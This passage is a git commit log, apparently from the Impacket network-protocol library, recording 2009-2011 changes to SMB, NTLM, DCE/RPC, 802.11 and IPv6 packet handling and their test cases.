Date:   Sat Jun 11 20:55:59 2011 +0000

    Added support for NetrShareEnum(Level1) and NetrShareGetInfo(Level2)

commit efc2bb662d71ff720af4c1fe8076844fbe82f378
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 8 02:37:58 2011 +0000

    Updated maintainer info

commit a11cc11a999c1fcc21a0a8b32fd452cb6b9b4395
Author: pditincho@gmail.com <pditincho@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 1 15:10:32 2011 +0000

    Addition of test suites for IP6_Address, IP6 and ICMP6. Several bugfixes and typographic corrections.

commit 98ed9275de29d22a47ae9e395cd6c2de849ad7b4
Author: pditincho@gmail.com <pditincho@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu May 26 14:48:34 2011 +0000

    Addition of support for IP6, ICMP6 and NDP packets. Addition of IP6_Address helper class.

commit f3fb8846cb816e9632aee58755de7df38d7191c9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 10 16:35:15 2011 +0000

    No need to change flags when asking for shares, reverting back to the ones we had before

commit a70de4de81bcf9280af9c32e15b3289d0688e83d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 10 16:33:06 2011 +0000

    Added support to specify domain when loggin in

commit ad26f3ae9bc87399bf25742dde35e12290e7a0db
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 10 16:30:35 2011 +0000

    Added support to specify domain when loggin in

commit b8b355c79f7625ebe59dc94235151762be3d23dc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Feb 8 01:46:25 2011 +0000

    Support for NULL login (just put login)
    Now it correctly handles open {host,port}

commit 2153773af3c0854ee22533bbda69438183adedee
Author: jigermano@gmail.com <jigermano@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 2 21:26:56 2011 +0000

    Issue 3: Bad SessionError message
    Issue 4: Copy with smb doesn't work
    Issue 5: Reference to an undefine ERRBROWSE
    Issue 6: wrong exceptions being raised

commit 1648086471439876f38bbb3a8f980b7e28c04d4b
Author: jigermano@gmail.com <jigermano@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 2 21:19:50 2011 +0000

    Fix Issue 2: NTLMAuthHeader should be used for DCE/RPC only, forgot a simple unittest checking the headers

commit f8cc713efe46088bce166b47d377493144964595
Author: jigermano@gmail.com <jigermano@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 2 21:10:49 2011 +0000

    Fix Issue 2: NTLMAuthHeader should be used for DCE/RPC only

commit f70f0604a21bd1faad2f5ba06d2f95e56ed126ae
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 24 14:39:58 2011 +0000

    at some point in time NTLM Auth and Encryption got broken when synchin stuff
    from Core's trunk. This commit fixes it, and adds something else, which we
    are not 100% sure, but works: data in a DCERPC packet can't be empty, we
    add 4 bytes when it is.

commit c346847c1ac68e99f1883576b2cc81070795a550
Author: gmoreira@gmail.com <gmoreira@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 18 17:56:45 2010 +0000

    a method for returning the reserved TCP header nibble was added

commit dd48420a715d807cebd1101ccf2c146e7c6aa3c5
Author: gmoreira@gmail.com <gmoreira@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 4 19:33:46 2010 +0000

    We modify RadioTap class to improve performance creating RadioTapField array at static time.

commit f180573798c8862202e189596345c7f7e1496e80
Author: gmoreira@gmail.com <gmoreira@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 3 16:05:15 2010 +0000

    Update to Core impact internal repository

commit d0a276794aa53c96a8d32068c3e2e3084bc3eff5
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 8 17:48:44 2010 +0000

    * Fixed keymanager problem in decoders
    * Fixed address place where the BSSID address was used. The BSSID address place is based on fromDS and toDS.
    * Fixed test-WEPDecoder.py, it used the incorrect address to add the key in the keymanager.
    * Tidy up Dot11DataDecoder, replaced individual frame control (Dot11) field setters (set_QoS, set_Addr4, set_privateFrame).
      Instead we pass through set_dot11_hdr method the Dot11 object, it's the frame control object.

commit bfb585ad64c5505b52dec4a7d8e7357269e7953e
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri May 21 14:09:39 2010 +0000

    Added DHCP INFORM contstant.

commit 7caeb7d0b1a5e99ca36e59e254ef33eef7c94d78
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 4 12:58:54 2010 +0000

    * Bugfixed in TCP encoder. get_th_flags is reading header size part too.
    * A Testcases added to check this and other methods.

commit 5cba79ba68676d1624568c01d8f556ffa920d85c
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 29 17:54:02 2010 +0000

    in the changeset [238], we made the mistake of using the packet total size instead of header size.

commit d8956789b8c1f07e5c058b5e0539080504fb8599
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 29 14:20:54 2010 +0000

    Bugfixed in RadioTap protocol encoder. The Radiotap header length wasn't updated when the packet was created from scratch or modifying by adding or removing fields to it.
    Also added a method to read the header length

commit e6e9d640b0bb5af81e9a2379540050c272edebcd
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 28 20:38:18 2010 +0000

    When we were creating a RadioTap packet from scratch, the constructor was calling to set_present method that was renamed to be private.

commit b6b1f1564a217d48c4c9ed754f4c18cae1723280
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 22 17:48:33 2010 +0000

     - Added DNS decoder and part of the encoder.

commit d89d0e603cc21c498538e46bcb619d8ff3e99b69
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 18 06:00:22 2010 +0000

    We facilitate the way that we do the auto checksum calculation in the IP class, the checksum is setted at 0x0000 internally in get_packet before doing the calculation. Before, this task, should be done manually by the user being prone to a mistake in the order they are calling set_ip_sum and set auto_checksum doing the calculation was not made or was made incorrectly.
    Added the reset_ip_sum method to IP class.

commit 552df832a919b3d36e3975a9b1e3d0416e53b3db
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 16 17:17:34 2010 +0000

    in changeset [229] We change bit endianess on getter/setter of managemenet authentication sequence but we missed to change related testcase.

commit d080f08afdb946badbff117603af439b3a868a10
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 16 17:15:11 2010 +0000

    Moved ProtocolPacket from dot11 to ImpactPacket so it can be used directly by the rest of the protocol classes from impacket without having to import dot11

commit ecdc4214281da7f2f009736bd05a75c47d0ca061
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 15 18:07:06 2010 +0000

    ImpacketException should inherit from Exception.

commit 2bb809f7cd1a85e21f8d98275864d8105375517e
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 6 02:25:52 2010 +0000

    Added get method in DHCP class for get DHCP options values

commit 463ec8c8d6e0aa38cc3cbc6ccdd67d60382b8e99
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 5 17:25:25 2010 +0000

    Bugfix in UDP class, self.parent() is a method not a attribute.

commit b8e58bf7dbc75079ba190d241f89b6205e17fadf
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Mar 3 18:17:02 2010 +0000

    Change bit endianess on getter/setter of authentication sequence.

commit 89331db947818d34f17862101cdba8678f4696fe
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Mar 3 18:03:21 2010 +0000

    In changeset [138] we introduced a bug on structure in unpack method that override fields dictionary when added inputData element.
    Fixed

commit 8c3a4400f57f0246e8fc520949ffd2ac352548a8
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 24 20:27:00 2010 +0000

     - Typo where are you!!

commit 09739d97c6a069a2352f1b3c8bab2a66e4dd17d5
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 24 20:10:22 2010 +0000

     - Changed some ugly param names i put on the last commit

commit 4e8939e68a8c4034ae5b978b162cc16de19ae0ae
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 24 16:03:04 2010 +0000

     - Added Reason Codes Constants
     - Added Auth Algorithm Constants
     - Added Status Codes Constants

commit f56b2b39e78b59c7d32d816a384dcc0ea3d2c20c
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 15 19:57:27 2010 +0000

     - Added Authentication Management Frame.
     - Added Association Request Management Frame.
     - Added Association Response Management Frame.
     - Added Disassociation Management Frame.
     - Added Reassociation Request Management Frame.
     - Added Reassociation Response Management Frame.

commit 30bb3a3de4d0a5565879b999b5626fd1da1d8ec0
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 8 18:32:43 2009 +0000

    Merged WEPIntermediate branch to added WEP Encryption/Decryption into trunk

commit 0634b5d0844f365f4870382c81ff32292bfb4f88
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 8 15:34:45 2009 +0000

    In changeset [216] we included by mistake not yet finalized changes

commit db7bcb672f0045011afeaf8e8ef1d767d484411e
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 8 15:08:45 2009 +0000

    In changeset [214], we forgot to modify exception text

commit 25e0a383fbaf0d48254724e1f8a9b42c27cfb39f
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 8 15:01:21 2009 +0000

    Bugfix: in IP datagrams, when decoding, checksum shouldn't be modified

commit 02043439eb3f0369e1ace9ecdf889fe79c240be5
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 8 14:31:48 2009 +0000

    Bug fixes in SNAP decoding

commit d8b9daa83c0cf99a0ebf1d94d17b4485f928877a
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Oct 28 15:32:50 2009 +0000

    path for IP Options up to 40 bytes, submitted by George.Khoury@viasat.com

commit e8290f3d08fc61e090b39ae6f30b5cded3bb9e61
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Oct 28 15:32:02 2009 +0000

    added warning message when no crypto library is available

commit 3f2f9a79deee7f4e85dae6768adf0c3601141a30
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Oct 28 15:22:39 2009 +0000

    small change in LICENSE

commit 703a6ee5f23496c135ba4c5ed085096681720cf9
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Oct 28 15:19:25 2009 +0000

    small fix to define POW as None when Crypto is not found and POW is not found

commit 33665a133d4faf9ef3df2f60c1829a58a15a4891
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 27 00:01:05 2009 +0000

    Fixed Typo: We forget to fix the testcases and Dot11 class

commit 50766729edf752417fe1e40728058248abf335ef
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 26 19:30:08 2009 +0000

    Fixed typo.

commit bd3de5f0f630572906db133bf8afbbe329871a63
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 15 04:38:03 2009 +0000

    Fixes in Dot11ManagementDeauthentication:
    * We incorrectly defined this as inheriting from Dot11ManagementFrame instead of ProtocolPacket.
    * We also forget the code to create a Dot11ManagementDeauthentication packet from scratch.

commit d8b30f309b599ce3dce65b235ad6358928ca2cc9
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 8 19:47:20 2009 +0000

    Added management deauthentication frame.

commit af9652a8bc3b6d4ebf6546f358a56cc802ee9b92
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 21 16:07:46 2009 +0000

    Fixed bug on RSN element parse.
    Modify test cases to work with modification on vendor specific element parser.

commit 494452cd934aa41b2ffcf810dd30cff1acb24af9
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 11 20:30:59 2009 +0000

    Added getter/setter of RSN Element.

commit d6b635d2e9b7a1f5ad78750a100275f1c13fd0a7
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 11 15:19:26 2009 +0000

    reverse and not engineering

commit 196935cc79f8da355eac496dca7637db30402bb9
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 11 15:06:01 2009 +0000

    Typo

commit 7117ecdd2b0f694c71998a042cada5a493672453
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 11 14:50:57 2009 +0000

    Added capabilities bitmap.

commit b012389f6e44c6d45f65d51c3c52896116c1d8e0
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 8 22:21:32 2009 +0000

    Merge with some bug fixing.

commit b866316784725ef860f3ad93a5e790f99a6ec09e
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 3 18:38:57 2009 +0000

    + Added 802.11 ProbeResponse testcase.
    + Add script to run all testcases in win32 host.

commit 652f0dc53fe18461490505558935b7600802dab9
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 2 22:20:36 2009 +0000

    dot11.py: Added classes to decode ProbeRequest and ProbeResponse dot11 Management frames.
    ImpactDecoder.py: + Fixed bug in RadioTap flag field when it's zero
                      + Added decoder for ProbeRequest and ProbeResponse dot11 Management frames.
    test-FrameManagementProbeRequest.py: Added testcases for ProbeRequest dot11 Management frames

commit 7afd005e5c438565b5eeec1ef3f2cbc4698cf23a
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 2 22:07:32 2009 +0000

    Fixed ident issues

commit d39a3e5831c64f97787a16c9dd5f1110d48a1b5a
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 1 19:19:41 2009 +0000

    Modified encryption handling to support keys

commit 8e2ecfb445118b37e3e23a2835a35b073e138790
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 1 15:49:06 2009 +0000

    Modified python executable path.

commit 0892e8d9068c163752b408643bfe188b63b062bb
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 31 18:56:09 2009 +0000

    I miss the method of the instance. :S

commit bb850e8f3ba1e884be214e4744316c70e783034b
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 26 19:02:04 2009 +0000

    Added Dot11ControlDecoder.

commit 35fbfc0a11b051e6f25d513d5ce95a3b235f6c93
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 9 00:30:59 2009 +0000

    Improvements in Management helper classes.
    Added vendor-specific getter/setter methods

commit 25d157b19acde9c3f81ccd93325cb6732bdc5f78
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 5 03:30:53 2009 +0000

    Improved Dot11 Management classes generalizing to the rest of the subtypes.
    Added base methods to delete elements, add/replace elements, etc.
    Added SSID and Supported Rates setters
    Added DS_Parameter_Set getter/setter

commit add55052f3638ae0b679651fd6b6c4ce629e8606
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 3 12:46:19 2009 +0000

    Deleted RadioTap unused private methods

commit 4ff8a1ec46a94ef79d980f39f97461ff87c8cbbe
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 3 04:57:44 2009 +0000

    Added getters methods for SSID and Supported Rates.
    An update related to previously commit is included in this changeset.

commit 920990bca217b2c30e79ca49491b126a9a56ce63
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 3 01:48:37 2009 +0000

    All dot11 packets have no FCS. This depends on the flag FCS_at_end in RadioTap protocol. In this changeset we handle these cases.

commit cd1569719eb463ef5d09871429baefdbc1c9a169
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 2 22:33:03 2009 +0000

    Updating of imports

commit 2a03e7a7747a6b4ca6d85d9045656b056825402d
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 2 22:16:21 2009 +0000

    Added an hierarchical updating packets mechanism.
    A packet is the body of the immediately superior packet, if it has a parent, within the hierarchy. If a package is changed, this must be reflected on the packages above.

commit 4f2bc706ecbc9c22734f8bf14b4f1cc5c068371f
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 2 00:45:30 2009 +0000

    Started writing the Management Class, its testcase and decoder.

commit fe3c7c9717a0909190212692ba511da9416394e4
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 2 00:15:38 2009 +0000

    Added long_long data type setter and getter to PacketBuffer class

commit 9c4498b4a49081581735c1657ce1d0d8c9fc7201
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 31 04:35:47 2009 +0000

    Completed RadioTap Protocol testcases and several fixes

commit 2640bba58c03ed9611de10856cc2c84b4661d7f4
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 31 01:32:52 2009 +0000

    Fixes in channel field. A test was added for this field in the RadioTap testcase.

commit c0b8d0f5d0c5663d5b0dfb13c7943c7f85737184
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 30 15:05:49 2009 +0000

    Added method to decoder base class for get a particular protocol

commit 792e8d98de3f4a6ccf34e88d143116685900e10e
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 29 02:01:15 2009 +0000

    Fixes in RadioTap decoder. Added testcase for RadioTap decoder

commit c76d8911a399831612f345a56c8072a21657a841
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 29 00:21:29 2009 +0000

    Add xchannel field setter's test in testcase

commit 83ab182957402b93c076ea29cbc562512c92e971
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 29 00:13:57 2009 +0000

    Added all the RadioTap field. Lack of testcases for this field.

commit 9b50a93f0163d7d38aee2b86c44808943b90fa8a
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 28 13:44:45 2009 +0000

    Rewrite of RadioTap class

commit 6f4ea36d14c35ea3bcdfcc9916dd56c72eff5bba
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 25 15:00:40 2009 +0000

    This was a pending change, was confusing and redundant that each class has the length of header and tail.

commit 2fc8c24fd7db418b43d09a6119ecbeca940b983a
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 25 14:33:06 2009 +0000

    The AbstractDot11 class was renamed to more appropiate name because it is no longer an abstract class, nor is it only for dot11

commit 0471f55bcffa48852f439a647c904973c0767745
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 24 14:08:52 2009 +0000

    Added getter/setter methods for flags and rate RadioTap fields

commit 43247fbf27ec69dc86e711858cc869d131385599
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 24 13:43:15 2009 +0000

    We unified format conversion to __set_field_from_string and __get_field_as_string

commit fbc6ebad062200ec76a43cb397f971087c395193
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 24 13:27:57 2009 +0000

    Deleted some lost lines

commit 50ef64c41e165f494fa0062d37b5e4a8c108b45b
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 23 23:27:20 2009 +0000

    Modified __get_field_position for return the field length too.
    Add unset_field method and tested in RadioTap testcase

commit 3528204d5ba5602908556bb7268d39737c2efef0
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 23 13:32:43 2009 +0000

    * Fixes with RadioTap header size when add a field
    * Improvements in the dot11 base class (AbstractDot11)
    * add unset_field method

commit 7b8a099cf185605d28f9838326d9c35c54125a3c
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 23 05:14:49 2009 +0000

    Advancing in the RadioTap class construction

commit 13284061dd19951bf49e14d6fe221ee6769360b4
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 6 01:51:39 2009 +0000

    renamed to more suitable name

commit 59380c7778154f49f523b23da1978a3a38403908
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 6 01:43:33 2009 +0000

    Added methods to handle WEP/WPA/WPA2 fields and their respective TestCases

commit 9fed0dea96a80ab60f601caa7f80d30d216638e7
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 4 22:37:05 2009 +0000

    Added test to check if get_packet() return the correct WEP Data content

commit 1416fe53d08a9ded0b7c284005c1e59aeba57472
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 4 22:25:39 2009 +0000

    Fixes in dot11 decoders. In this context, a testcase was added

commit 51d6333234ac5f9c95fad2b650ace13eaff479eb
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 4 22:22:53 2009 +0000

    removed debug line

commit ec8ef633bf852d5f0d25828706b09fb23e2aab5a
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 3 03:33:47 2009 +0000

    Completed WEP testcase

commit 41cf5524a15336accec29ff72439710445868ed9
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 3 03:31:40 2009 +0000

    Fixes handling tail frame part. Fixes in WEP frames

commit e77f9e457e60b44de754704a7afb0b4cbf7baf70
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 30 03:49:08 2009 +0000

    Updated WEP/WPA/WPA2 classes
    Outlined WEP/WPA/WPA2 decoders

commit 639ca77ed412935de1d7de383abbda887a43db56
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 30 02:16:13 2009 +0000

    Data Frames and WEP updated

commit 473306c15334f6560010ad30e5867a362e3f5781
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 29 11:57:59 2009 +0000

    *Adjustments to new class design.

commit 01f2a0561fbc00932554ef61cb38272d043a1d04
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 24 02:25:15 2009 +0000

    changed to use asserts unittest for this check

commit 8d3614b0953a29da856584e35a61383a181d4643
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 22 05:12:10 2009 +0000

    Outlined of decoders. Although not tested

commit 0f2777aaa1c01b2d8fa150d08b95e29a857bf3e6
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 22 05:08:53 2009 +0000

    * New design, rewritten a lot of the code.
    * Separated DataAddr4 and DataQoS from Data.
    * Adapted testcases for Dot11 and Dot11DataFrame
    * Added LLC Header class
    * Added SNAP Header class

commit bd6dcc8325fa6b5797e2f6d524c0a0a9374ccab2
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 22 04:53:59 2009 +0000

    Was separated from Header class all the protocol layers logic to ProtocolLayer class and now Header inherits from this too. This does not affect the rest of the code
    Dot11 needs inherit only the ProtocolLayer stuff.

commit 242128b7f4cb37cef8051cec1614b13d232d8cba
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 9 05:50:53 2009 +0000

    Some fixes for CFEndCFACK and PSPoll. There is still an error to fix

commit 81e5e4055bf0b220be1d86e5a04bfa908ec395da
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 9 05:47:42 2009 +0000

    This comment is no longer valid

commit 39a4fb47bc5fb310a5b8abfe8e985906e685059c
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 9 05:46:15 2009 +0000

    we must keep in mind that comments about AID (Association ID) field

commit cd35a20e77471de8d0214a5f27901d834be47003
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 9 02:55:56 2009 +0000

    Frame Control PS-Poll has AID field, and not DURATION

commit c9749f220972b5a83c6fcca3dc67f43f8097c26a
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 9 02:41:31 2009 +0000

    Removed trailing word "field" from each method name

commit 80469292e1c1a980f948df498e1178b5d048cd24
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 8 20:08:29 2009 +0000

    reordered ECN responder, and added some debug prints (commented out)

commit 8d7df3253e211fcbc6037cbfc1986e63207f158b
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 8 19:26:52 2009 +0000

    removed some unused stuff

commit 7cdfaebd08c69fc8a89f8457af61e9d483141a1d
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 8 19:13:09 2009 +0000

    added --help parameter

commit 92e98fbe63ae414cecca1fa9a02bb96ab6496654
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 4 20:26:48 2009 +0000

    added PcapFile.reset()

commit 79de6f63eafbab6cae83214acbfe08a97d50c5ee
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 4 19:33:31 2009 +0000

    added class PcapFile. it can be used to read and write pcap files

commit 0e13dfc4d916ea7209e3fda9beaf9cb380d70e2c
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 4 19:33:05 2009 +0000

    @classmethod
    Structure.fromFile(aFile)

commit e68a9ac853ab93d15cb21afd4a6167ce4fc90f2a
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 4 19:17:00 2009 +0000

    Added partial support for IEEE 802.11 Network packet codecs

commit 30095536e4486b89c15f96882d9591f93cc96d13
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 4 18:55:05 2009 +0000

    simple label rename

commit 959631877489c85ca271b2adb6a861c62ed7d85d
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 4 16:17:19 2009 +0000

    bug fix: when packing "=" fields, "&" couldn't be used inside the code because "&" type specifier had precendence over "&"

commit 4a5fd5c368cb0b55def853b7158bb9bb23fd0688
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 4 16:16:27 2009 +0000

    new test, example of how to pack and unpack bitfields

commit a6225280737ce006d7e1c7e6c116b6db47ee2143
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 19 15:55:04 2009 +0000

    documentation fix

commit 2c74f0520b26fcd4699d9b07745700544bf23fb9
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 12 22:39:54 2009 +0000

